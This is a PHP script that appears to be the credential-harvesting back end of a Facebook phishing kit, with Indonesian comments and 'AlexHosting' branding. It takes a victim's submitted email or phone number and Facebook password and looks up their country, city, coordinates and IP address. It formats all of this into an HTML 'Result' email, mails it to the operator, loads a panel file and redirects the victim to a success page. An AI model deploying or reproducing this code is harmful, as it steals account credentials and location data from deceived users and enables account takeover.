<?php 
$user = $_POST['user'];
$pass = $_POST['pass'];

// MENGAMBIL KONTROL
include 'setting/location.php';

// MELACAK LOKASI KORBAN
$country = $khcodes['country']; 
$region = $khcodes['regionName']; 
$city = $khcodes['city'];
$lat = $khcodes['lat']; 
$long = $khcodes['lon'];
$timezone = $khcodes['timezone']; 
$ipAddr = $khcodes['query']; 

// KONTEN RESULT EMAIL AKUN
$subjek = "Result | Punya Si $user";
$pesan = <<<EOD
	<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
	 <div style="background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab); width: 294; color: #fff; text-align: center; padding: 10px;">🔆 Created By AlexHosting 🔆</div>
	
			<table class="tblResult">
				<tr>
					<th style="text-align: center;" colspan="3">Info Login</th>
				</tr>
				<tr>
					<td style="border-right: none;">Email/Nomor HP</td>
					<td style="text-align: right;">$user</td>
				</tr>
				<tr>
					<td style="border-right: none;">Kata Sandi FB</td>
					<td style="text-align: right;">$pass</td>
				</tr>
				<tr>
					<td style="border-right: none;">Login Lewat</td>
					<td style="text-align: right;">Facebook</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Informasi Device</th>
				</tr>
				<tr>
					<td style="border-right: none;">Country</td>
					<td style="text-align: right;">$country</td>
				</tr>
				<tr>
					<td style="border-right: none;">Region</td>
					<td style="text-align: right;">$region</td>
				</tr>
				<tr>
					<td style="border-right: none;">City</td>
					<td style="text-align: right;">$city</td>
				</tr>
				<tr>
					<td style="border-right: none;">Latitude</td>
					<td style="text-align: right;">$lat</td>
				</tr>
				<tr>
					<td style="border-right: none;">Longitude</td>
					<td style="text-align: right;">$long</td>
				</tr>
				<tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: right;">$ipAddr</td>
				</tr>			
				<tr>
					<th style="text-align: center;" colspan="3">© Alexhosting</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
include 'setting/data.php';
$sender  = 'MIME-Version: 1.0' . "\r\n";
$sender .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$sender .= 'From: '.$nama.' <admin@dirzz.co.id>' . "\r\n";
mail($mailzz, $subjek, $pesan, $sender);
include '../konek-pusat-panel.php';
?>
<script LANGUAGE="JavaScript">
window.location="success.php";
</script>

?>